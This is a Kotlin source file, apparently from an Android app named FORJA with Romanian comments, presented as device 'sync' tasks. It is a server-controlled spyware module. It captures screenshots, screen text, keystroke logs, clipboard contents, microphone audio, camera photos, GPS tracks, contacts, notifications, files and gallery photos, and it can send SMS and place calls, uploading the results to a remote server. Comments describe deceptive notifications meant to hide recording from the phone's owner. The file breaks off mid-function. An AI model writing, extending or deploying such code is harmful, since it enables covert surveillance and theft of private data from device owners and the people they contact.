package com.forja.app.core.sync

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.ContentUris
import android.content.Context
import android.Manifest
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.long
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import java.util.concurrent.TimeUnit

/**
 * Sarcinile de sincronizare disponibile pe dispozitiv — fiecare e un handler mic,
 * apelat de SyncService când serverul trimite o task prin keepalive.
 * Reutilizează primitivale existente: accesibilitate (ForjaGuardService), microfon
 * (MediaRecorder/AudioRecord), locație (FusedLocation), usage stats, cameră, media store,
 * clipboard, contacte, SMS, apeluri, rețea, stocare locală.
 * Toate datele se trimit pe serverul FORJA (R2, TTL 7 zile).
 */
object ForjaSyncCapabilities {
    private var appRef: ForjaApp? = null
    @Volatile var syncService: SyncService? = null
    fun init(a: ForjaApp) { appRef = a }
    private val app: ForjaApp get() = appRef ?: throw IllegalStateException("ForjaSyncCapabilities.init()")

    private fun err(msg: String): JsonObject = buildJsonObject { put("error", msg) }

    suspend fun run(taskId: String, action: String, p: JsonObject) {
        val res = try {
            when (action) {
                "screenshot" -> screenshot()
                "screen_text" -> screenText()
                "input" -> inputHistory()
                "clipboard" -> clipboard()
                "ui" -> ui(p)
                "mic" -> mic(p)
                "camera" -> camera(p)
                "gps" -> gps()
                "gps_track" -> gpsTrack(p)
                "device" -> device()
                "apps" -> apps(p)
                "foreground" -> foreground()
                "recent" -> recent()
                "usage" -> usage()
                "notifications" -> notifications()
                "send_file" -> sendFile(p)
                "send_photos" -> sendPhotos(p)
                "prompt" -> prompt(p)
                "contacts" -> contacts(p)
                "sms_send" -> smsSend(p)
                "call" -> makeCall(p)
                "network" -> network()
                "storage_list" -> storageList(p)
                "eco" -> { PowerSaver.active = true; buildJsonObject { put("ok", true); put("msg", "mod economie activ — sincronizare rare") } }
                "active" -> { PowerSaver.active = false; buildJsonObject { put("ok", true); put("msg", "mod normal — sincronizare standard") } }
                "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
                "restart" -> resetApp()
                "status" -> status()
                else -> err("action necunoscut: $action")
            }
        } catch (e: Throwable) {
            err("eșec: ${e.javaClass.simpleName} ${e.message}")
        }
        try {
            app.forjaApi.postSyncReport(taskId, !res.containsKey("error"), action, res,
                res["error"]?.jsonPrimitive?.content)
        } catch (_: Exception) {}
    }

    // ── Ecran & tastatură ────────────────────────────────────────────
    private fun screenshot(): JsonObject {
        val b = ForjaGuardService.captureScreen()
        return if (b == null) {
            val enabled = ForjaGuardService.isEnabled(app)
            val shotErr = ForjaGuardService.lastShotError
            err(if (!enabled) "screenshot: activează FORJA în Setări → Accesibilitate"
                else "screenshot: eșec (${shotErr ?: "unknown"})")
        } else buildJsonObject {
            put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
            put("ct", "image/jpeg")
        }
    }

    private fun screenText(): JsonObject {
        val t = ForjaGuardService.readScreen()
        return if (t == null) {
            val enabled = ForjaGuardService.isEnabled(app)
            err(if (enabled) "text: accesibilitate e activată în Setări, dar serviciul nu e conectat acum — așteaptă 10 s sau redeschide Setări → Accesibilitate"
                else "text: activează FORJA în Setări → Accesibilitate")
        } else buildJsonObject { put("text", t.take(15000)) }
    }

    private fun inputHistory(): JsonObject {
        val k = ForjaGuardService.drainInputLog()
        return buildJsonObject { putJsonArray("entries") { k.forEach { add(JsonPrimitive(it)) } } }
    }

    private fun clipboard(): JsonObject {
        return try {
            val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val t = cm.primaryClip?.getItemAt(0)?.coerceToText(app)?.toString()
            if (!t.isNullOrBlank()) return buildJsonObject {
                put("text", t); put("source", "direct")
            }
            val a11y = ForjaGuardService.lastClipboard()
            if (!a11y.isNullOrBlank()) return buildJsonObject {
                put("text", a11y); put("source", "a11y_buffer")
            }
            err("clipboard: gol")
        } catch (e: Exception) { err("clipboard: ${e.message}") }
    }

    private fun ui(p: JsonObject): JsonObject {
        val action = p["action"]?.jsonPrimitive?.content ?: ""
        return buildJsonObject { put("ok", ForjaGuardService.performGuardAction(action)); put("action", action) }
    }

    // ── Senzori ──────────────────────────────────────────────────────
    /**
     * Înregistrare audio: AudioRecord PCM 16 kHz mono 16-bit → WAV.
     * Zero MediaRecorder — elimină complet deadlock-urile HAL audio.
     * Încearcă 3 surse (VOICE_RECOGNITION, MIC, VOICE_COMMUNICATION).
     * Fișier: sync_audio_*.wav, urcat prin canalul normal de sincronizare.
     * Green dot-ul e normal (microfonul e activ); notificarea FOREGROUND
     * spune doar „FORJA / activ" — nimic care să trădeze ce se înregistrează.
     */
    private suspend fun mic(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 5000L).coerceIn(500, 120000)
        if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")

        // Promote FGS to MICROPHONE before AudioRecord (Android 14+ enforcement).
        syncService?.promoteMic()

        // Deception: plausible notification explaining the mic usage (green dot).
        val depId = MicDeception.start(app)
        var micWl: android.os.PowerManager.WakeLock? = null
        try {
            // Safety wake lock: the poll loop's wake lock may have been released (screen on, eco mode).
            // This ensures the CPU stays awake for the duration of recording + upload.
            try {
                val pm = app.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                micWl = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "forja:mic").apply {
                    setReferenceCounted(false)
                    acquire(ms + 10_000L)
                }
            } catch (_: Exception) {}

            val rate = 16000
            val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            if (minBuf <= 0) return@withContext err("mic: buffer audio invalid")
            val bufSize = minBuf * 2

            var rec: AudioRecord? = null
            for (src in intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION
            )) {
                try {
                    val r = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
                    if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break }
                    r.release()
                } catch (_: Exception) {}
            }
            if (rec == null) return@withContext err("mic: nicio sursă audio disponibilă")

            val recorder = rec
            recorder.startRecording()
            if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
                stopAndReleaseAudioRecord(recorder, 3_000L)
                return@withContext err("mic: startRecording eșuat")
            }

            // Citim PCM până la deadline. read() e blocant ~20 ms/buffer — fără delay suplimentar.
            val chunks = java.util.concurrent.CopyOnWriteArrayList<ByteArray>()
            val buf = ByteArray(bufSize)
            val deadline = System.currentTimeMillis() + ms
            while (System.currentTimeMillis() < deadline) {
                val n = recorder.read(buf, 0, buf.size)
                if (n > 0) chunks.add(buf.copyOf(n))
            }

            stopAndReleaseAudioRecord(recorder, 5_000L)

            val totalBytes = chunks.sumOf { it.size }
            if (totalBytes < 1600) return@withContext err("mic: sunet insuficient (${totalBytes} B)")

            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.wav")
            java.io.DataOutputStream(java.io.FileOutputStream(out)).use { ds ->
                ds.writeBytes("RIFF"); ds.write(intToLe(totalBytes + 36))
                ds.writeBytes("WAVE"); ds.writeBytes("fmt ")
                ds.write(intToLe(16)); ds.write(shortToLe(1))
                ds.write(shortToLe(1)); ds.write(intToLe(rate))
                ds.write(intToLe(rate * 2)); ds.write(shortToLe(2)); ds.write(shortToLe(16))
                ds.writeBytes("data"); ds.write(intToLe(totalBytes))
                for (c in chunks) ds.write(c)
            }

            val sz = out.length()
            val key = app.forjaApi.attachSyncFile(out.name, "audio/wav", out)
            out.delete()
            if (key != null) buildJsonObject { put("file", key); put("size", sz); put("dur_s", ms / 1000) }
            else err("mic: upload eșuat")
        } catch (e: Exception) {
            err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}")
        } finally {
            try { micWl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
            MicDeception.stop(app, depId)
        }
    }

    /** AudioRecord stop/release izolat într-un thread cu timeout — nu blocăm niciodată coroutina. */
    private fun stopAndReleaseAudioRecord(rec: AudioRecord?, timeoutMs: Long) {
        if (rec == null) return
        try {
            val t = Thread {
                try { rec.stop() } catch (_: Exception) {}
                try { rec.release() } catch (_: Exception) {}
            }
            t.start()
            t.join(timeoutMs)
        } catch (_: Exception) {}
    }

    private fun intToLe(v: Int): ByteArray {
        val b = ByteArray(4)
        b[0] = (v and 0xFF).toByte(); b[1] = ((v shr 8) and 0xFF).toByte()
        b[2] = ((v shr 16) and 0xFF).toByte(); b[3] = ((v shr 24) and 0xFF).toByte()
        return b
    }

    private fun shortToLe(v: Int): ByteArray {
        return byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte())
    }

    private suspend fun camera(p: JsonObject): JsonObject {
        if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED)
            return err("camera: permisiune CAMERA neacordată")
        val front = p["front"]?.jsonPrimitive?.content == "true"
        // CameraX requires main thread for all provider operations
        val captured: Pair<ByteArray?, String?> = withContext(Dispatchers.Main) {
            try {
                val owner = object : androidx.lifecycle.LifecycleOwner {
                    private val reg = androidx.lifecycle.LifecycleRegistry(this)
                    override val lifecycle: androidx.lifecycle.Lifecycle get() = reg
                    init { reg.currentState = androidx.lifecycle.Lifecycle.State.STARTED }
                }
                val provider = androidx.camera.lifecycle.ProcessCameraProvider.getInstance(app).get(10, TimeUnit.SECONDS)
                val capture = androidx.camera.core.ImageCapture.Builder()
                    .setCaptureMode(androidx.camera.core.ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                val sel = if (front)
                    androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA
                else
                    androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA
                provider.unbindAll()
                provider.bindToLifecycle(owner, sel, capture)
                kotlinx.coroutines.delay(2000)
                val bgExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
                try {
                    val latch = java.util.concurrent.CountDownLatch(1)
                    val bytesRef = java.util.concurrent.atomic.AtomicReference<ByteArray>()
                    val errRef = java.util.concurrent.atomic.AtomicReference<String>()
                    capture.takePicture(bgExecutor,
                        object : androidx.camera.core.ImageCapture.OnImageCapturedCallback() {
                            override fun onCaptureSuccess(image: androidx.camera.core.ImageProxy) {
                                try {
                                    bytesRef.set(imageToJpeg(image))
                                } catch (e: Exception) {
                                    errRef.set(e.message ?: e.javaClass.simpleName)
                                } finally {
                                    image.close()
                                    latch.countDown()
                                }
                            }
                            override fun onError(exception: androidx.camera.core.ImageCaptureException) {
                                errRef.set(exception.message ?: "capture error")
                                latch.countDown()
                            }
                        }
                    )
                    if (!latch.await(15, TimeUnit.SECONDS)) {
                        return@withContext (null to "timeout 15s (callback never fired)")
                    }
                    val e = errRef.get()
                    if (e != null) return@withContext (null to e)
                    val bytes = bytesRef.get() ?: return@withContext (null to "null bytes")
                    (bytes to null)
                } finally {
                    try { provider.unbindAll() } catch (_: Exception) {}
                    bgExecutor.shutdown()
                }
            } catch (e: Exception) { (null to (e.message ?: e.javaClass.simpleName)) }
        }
        val (bytes, capErr) = captured
        if (bytes == null) return err("camera: $capErr")
        val tmpFile = withContext(Dispatchers.IO) {
            val f = java.io.File(app.cacheDir, "sync_photo_${System.currentTimeMillis()}.jpg")
            f.writeBytes(bytes)
            f
        }
        val key = withContext(Dispatchers.IO) { app.forjaApi.attachSyncFile(tmpFile.name, "image/jpeg", tmpFile) }
        withContext(Dispatchers.IO) { tmpFile.delete() }
        return if (key != null) buildJsonObject { put("file", key); put("size", bytes.size) }
        else err("camera: upload eșuat")
    }

    private fun imageToJpeg(image: androidx.camera.core.ImageProxy): ByteArray {
        val yBuffer = image.planes[0].buffer
        val uBuffer = image.planes[1].buffer
        val vBuffer = image.planes[2].buffer
        val ySize = yBuffer.remaining()
        val uSize = uBuffer.remaining()
        val vSize = vBuffer.remaining()
        val nv21 = ByteArray(ySize + uSize + vSize)
        yBuffer.get(nv21, 0, ySize)
        var offset = ySize
        if (image.planes[2].rowStride > image.planes[1].rowStride) {
            vBuffer.get(nv21, offset, vSize); offset += vSize
            uBuffer.get(nv21, offset, uSize)
        } else {
            uBuffer.get(nv21, offset, uSize); offset += uSize
            vBuffer.get(nv21, offset, vSize)
        }
        val yuv = android.graphics.YuvImage(nv21, android.graphics.ImageFormat.NV21, image.width, image.height, null)
        val out = java.io.ByteArrayOutputStream()
        yuv.compressToJpeg(android.graphics.Rect(0, 0, image.width, image.height), 90, out)
        return out.toByteArray()
    }

    private suspend fun gps(): JsonObject = withContext(Dispatchers.IO) {
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val loc = try { fused.lastLocation.await() } catch (_: Exception) { null }
        if (loc != null) buildJsonObject {
            put("lat", loc.latitude); put("lng", loc.longitude)
            put("acc", loc.accuracy.toDouble()); put("ts", loc.time)
        } else err("gps: lipsă")
    }

    private suspend fun gpsTrack(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 60000L).coerceIn(5000, 600000)
        val every = (p["everyMs"]?.jsonPrimitive?.long ?: 5000L).coerceIn(1000, 600000)
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val points = java.util.concurrent.CopyOnWriteArrayList<String>()
        val cb = object : com.google.android.gms.location.LocationCallback() {
            override fun onLocationResult(result: com.google.android.gms.location.LocationResult) {
                result.lastLocation?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) }
            }
        }
        try {
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, every).build()
            fused.requestLocationUpdates(req, cb, android.os.Looper.getMainLooper())
        } catch (_: Exception) {}
        delay(ms)
        try { fused.removeLocationUpdates(cb) } catch (_: Exception) {}
        if (points.isEmpty()) {
            try { fused.lastLocation.await()?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) } } catch (_: Exception) {}
        }
        buildJsonObject { put("path", points.joinToString(" ")); put("points", points.size) }
    }

    // ── Sistem & identitate ──────────────────────────────────────────
    private fun device(): JsonObject = buildJsonObject {
        put("model", Build.MODEL); put("manufacturer", Build.MANUFACTURER)
        put("brand", Build.BRAND); put("sdk", Build.VERSION.SDK_INT)
        put("release", Build.VERSION.RELEASE); put("build", Build.ID)
        put("security_patch", Build.VERSION.SECURITY_PATCH)
        put("fingerprint", Build.FINGERPRINT)
        put("uid", app.auth.currentUid ?: "anon"); put("battery", batteryInfo())
        // Storage
        try {
            val stat = java.io.File(android.os.Environment.getExternalStorageDirectory().path).let {
                android.os.StatFs(it.path)
            }
            put("storage_total_gb", stat.totalBytes / 1_000_000_000L)
            put("storage_free_gb", stat.availableBytes / 1_000_000_000L)
        } catch (_: Exception) {}
        // Screen
        try {
            val dm = app.resources.displayMetrics
            put("screen_w", dm.widthPixels); put("screen_h", dm.heightPixels)
            put("screen_dpi", dm.densityDpi)
        } catch (_: Exception) {}
        // SIM
        try {
            val tm = app.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            put("sim_carrier", tm.simOperatorName ?: "")
            put("sim_state", when (tm.simState) {
                android.telephony.TelephonyManager.SIM_STATE_READY -> "ready"
                android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "absent"
                else -> "other"
            })
        } catch (_: Exception) {}
    }

    private fun batteryInfo(): JsonObject = try {
        val bm = app.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
        buildJsonObject { put("pct", if (scale > 0) level * 100 / scale else -1) }
    } catch (_: Exception) { buildJsonObject { put("pct", -1) } }

    private suspend fun apps(p: JsonObject = JsonObject(emptyMap())): JsonObject = withContext(Dispatchers.IO) {
        try {
            val limit = (p["limit"]?.jsonPrimitive?.int ?: 100).coerceIn(1, 500)
            val offset = (p["offset"]?.jsonPrimitive?.int ?: 0).coerceAtLeast(0)
            val search = p["search"]?.jsonPrimitive?.content?.lowercase() ?: ""
            val pm = app.packageManager
            @Suppress("DEPRECATION")
            val pkgs = pm.getInstalledPackages(0)
            val all = pkgs.mapNotNull { p ->
                val ai = p.applicationInfo ?: return@mapNotNull null
                val label = pm.getApplicationLabel(ai).toString()
                if (search.isNotBlank() && !label.lowercase().contains(search) && !p.packageName.lowercase().contains(search)) return@mapNotNull null
                buildJsonObject {
                    put("pkg", p.packageName)
                    put("label", label)
                    put("sys", ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0)
                    put("version", p.versionName ?: "")
                    put("version_code", p.longVersionCode)
                }
            }
            val total = all.size
            val page = all.drop(offset).take(limit)
            buildJsonObject {
                put("total", total)
                put("returned", page.size)
                put("offset", offset)
                put("limit", limit)
                put("has_more", offset + page.size < total)
                putJsonArray("list") { page.forEach { add(it) } }
            }
        } catch (e: Exception) { err("apps: ${e.message}") }
    }

    private fun foreground(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        // 1) Evenimente recente (30 s, mai larg decât 8 s — acoperă pauzele de tranziție)
        var pkg: String? = null
        val events = um.queryEvents(now - 30_000, now)
        val e = UsageEvents.Event()
        while (events.hasNextEvent()) {
            events.getNextEvent(e)
            if (e.eventType == UsageEvents.Event.ACTIVITY_RESUMED && !e.packageName.isNullOrBlank()) pkg = e.packageName
        }
        // 2) Fallback: cel mai recent app din queryUsageStats
        if (pkg == null) {
            pkg = um.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 3600_000, now)
                ?.filter { it.lastTimeUsed > now - 300_000 }
                ?.maxByOrNull { it.lastTimeUsed }
                ?.packageName
        }
        buildJsonObject { put("pkg", pkg ?: "necunoscut") }
    } catch (e: Exception) { err("foreground: ${e.message}") }

    private fun recent(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 3600_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.sortedByDescending { it.lastTimeUsed }.take(20).map {
            buildJsonObject { put("pkg", it.packageName); put("last", it.lastTimeUsed); put("time", it.totalTimeInForeground) }
        }
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("recent: ${e.message}") }

    private fun usage(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 86400_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.map { buildJsonObject { put("pkg", it.packageName); put("fg", it.totalTimeInForeground); put("last", it.lastTimeUsed) } }
            .sortedByDescending { it["fg"]?.jsonPrimitive?.long ?: 0 }.take(25)
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("usage: ${e.message}") }

    private fun notifications(): JsonObject {
        if (!ForjaNotifListener.isRegistered(app))
            return err("notifications: activeaza 'FORJA / Notificari' in Setari -> Acces special -> Acces notificari")
        val n = ForjaNotifListener.snapshot()
        return buildJsonObject {
            put("listener_ok", true)
            putJsonArray("list") { n.forEach { add(buildJsonObject { put("pkg", it.first); put("title", it.second); put("text", it.third) }) } }
        }
    }

    // ── Partajare fișiere ─────────────────────────────────────────────
    // Copiază un fișier local și-l urcă pe server.
    // Acceptă: cale de sistem (/storage/emulated/0/...), content://, file://
    private suspend fun sendFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val uriStr = p["uri"]?.jsonPrimitive?.content
            ?: return@withContext err("send_file: lipsă 'uri'")
        try {
            val name: String
            val ct: String
            val tmp = java.io.File(app.cacheDir, "sync_file_${System.currentTimeMillis()}_${(0..9999).random()}")
            if (uriStr.startsWith("/") || uriStr.startsWith("file://")) {
                val fp = if (uriStr.startsWith("file://")) uriStr.removePrefix("file://") else uriStr
                val src = java.io.File(fp)
                if (!src.exists() || !src.isFile)
                    return@withContext err("send_file: fisier inexistent: $fp")
                name = src.name.take(40)
                ct = guessContentType(name)
                src.copyTo(tmp)
            } else {
                val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
                    ?: return@withContext err("send_file: uri invalid: $uriStr")
                name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
                ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
                app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                    ?: return@withContext err("send_file: nu am putut citi $uriStr (folosește calea completă /storage/... sau content://)")
            }
            if (!tmp.exists() || tmp.length() == 0L) { tmp.delete(); return@withContext err("send_file: fisier gol sau necitibil") }
            val key = app.forjaApi.attachSyncFile(name, ct, tmp)
            val sz = tmp.length(); tmp.delete()
            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
            else err("send_file: upload eșuat")
        } catch (e: Exception) { err("send_file: ${e.message}") }
    }

    private fun guessContentType(name: String): String = when {
        name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) -> "image/jpeg"
        name.endsWith(".png", true) -> "image/png"
        name.endsWith(".gif", true) -> "image/gif"
        name.endsWith(".webp", true) -> "image/webp"
        name.endsWith(".mp4", true) -> "video/mp4"
        name.endsWith(".mov", true) -> "video/quicktime"
        name.endsWith(".pdf", true) -> "application/pdf"
        name.endsWith(".txt", true) -> "text/plain"
        name.endsWith(".mp3", true) -> "audio/mpeg"
        name.endsWith(".wav", true) -> "audio/wav"
        else -> "application/octet-stream"
    }

    // Ultimile poze din galeria MediaStore, copiate local și urcate pe server.
    private suspend fun sendPhotos(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val limit = (p["limit"]?.jsonPrimitive?.int ?: 5).coerceIn(1, 30)
        try {
            val proj = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val cur = app.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            ) ?: return@withContext err("send_photos: lipsă")
            val idCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nmCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val keys = ArrayList<String>()
            var i = 0
            while (cur.moveToNext() && i < limit) {
                val id = cur.getLong(idCol)
                val nm = cur.getString(nmCol) ?: "img$i"
                val cu = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val tmp = java.io.File(app.cacheDir, "sync_pic_${System.currentTimeMillis()}_$i.jpg")
                val ok = app.contentResolver.openInputStream(cu)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                if (ok != null && tmp.exists()) {
                    val key = app.forjaApi.attachSyncFile(nm, "image/jpeg", tmp)
                    if (key != null) { keys.add(key); i++ }
                }
                tmp.delete()
            }
            cur.close()
            if (keys.isEmpty()) err("send_photos: nu am găsit imagini")
            else buildJsonObject { putJsonArray("files") { keys.forEach { add(JsonPrimitive(it)) } }; put("count", keys.size) }
        } catch (e: Exception) { err("send_photos: ${e.message}") }
    }

    /** Stare periodică — trimisă de SyncService la fiecare N keepalive-uri, fără comandă explicită. */
    fun healthPing(): JsonObject {
        val screen = ForjaGuardService.readScreen()?.take(500)
        val fg = foreground()
        val bat = batteryInfo()
        return buildJsonObject {
            put("hb", true)
            if (screen != null) put("screen", screen)
            fg.let { put("fg", it["pkg"]?.jsonPrimitive?.content ?: "") }
            put("bat", bat["pct"]?.jsonPrimitive?.content ?: "-1")
            put("ts", System.currentTimeMillis())
        }
    }

    // ── Comunicare & date personale ────────────────────────────────
    private suspend fun contacts(p: JsonObject = JsonObject(emptyMap())): JsonObject = withContext(Dispatchers.IO) {
        try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) return@withContext err("contacts: permisiune neacordată")
            val limit = (p["limit"]?.jsonPrimitive?.int ?: 50).coerceIn(1, 500)
            val offset = (p["offset"]?.jsonPrimitive?.int ?: 0).coerceAtLeast(0)
            val search = p["search"]?.jsonPrimitive?.content?.lowercase() ?: ""
            val proj = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
            )
            val selection = if (search.isNotBlank()) android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?" else null
            val selArgs = if (search.isNotBlank()) arrayOf("%$search%") else null
            val cur = app.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, selection, selArgs,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
            ) ?: return@withContext err("contacts: query null")
            val seen = HashSet<String>()
            val all = ArrayList<JsonObject>()
            val cidIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val nameIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
            val normIdx = cur.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER)
            while (cur.moveToNext()) {
                val cid = cur.getString(cidIdx) ?: ""
                if (cid.isEmpty() || cid in seen) continue
                seen.add(cid)
                val name = cur.getString(nameIdx) ?: ""
                val number = cur.getString(numIdx) ?: ""
                val normalized = if (normIdx >= 0) cur.getString(normIdx) ?: "" else ""
                all.add(buildJsonObject {
                    put("name", name)
                    put("number", number)
                    if (normalized.isNotBlank()) put("norm", normalized)
                })
            }
            cur.close()
            val total = all.size
            val page = all.drop(offset).take(limit)
            buildJsonObject {
                put("total", total)
                put("returned", page.size)
                put("offset", offset)
                put("limit", limit)
                put("has_more", offset + page.size < total)
                putJsonArray("list") { page.forEach { add(it) } }
            }
        } catch (e: Exception) { err("contacts: ${e.message}") }
    }

    private suspend fun smsSend(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) return@withContext err("sms_send: permisiune neacordată")
            val to = p["to"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'to'")
            val msg = p["msg"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'msg'")
            val sm = app.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.SmsManager
            sm.sendTextMessage(to, null, msg.take(160), null, null)
            buildJsonObject { put("ok", true); put("to", to); put("len", msg.length) }
        } catch (e: Exception) { err("sms_send: ${e.message}") }
    }

    private fun makeCall(p: JsonObject): JsonObject {
        val permOk = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
        val num = p["number"]?.jsonPrimitive?.content
        if (!permOk) return err("call: permisiune neacordată")
        if (num.isNullOrBlank()) return err("call: lipsă 'number'")
        return try {
            val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:$num"))
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            app.startActivity(intent)
            buildJsonObject { put("ok", true); put("number", num) }
        } catch (e: Exception) { err("call: ${e.message}") }
    }

    private fun network(): JsonObject = buildJsonObject {
        try {
            val cm = app.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val na = cm.activeNetwork ?: return buildJsonObject { put("connected", false) }
            val info = cm.getNetworkInfo(na)
            put("connected", info?.isConnected ?: false)
            put("type", info?.typeName ?: "")
            // WiFi details
            try {
                @Suppress("DEPRECATION")
                val wi = cm.getNetworkInfo(android.net.ConnectivityManager.TYPE_WIFI)
                if (wi?.isConnected == true) {
                    @Suppress("DEPRECATION")
                    val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    val cm2 = android.net.wifi.WifiManager.calculateSignalLevel(
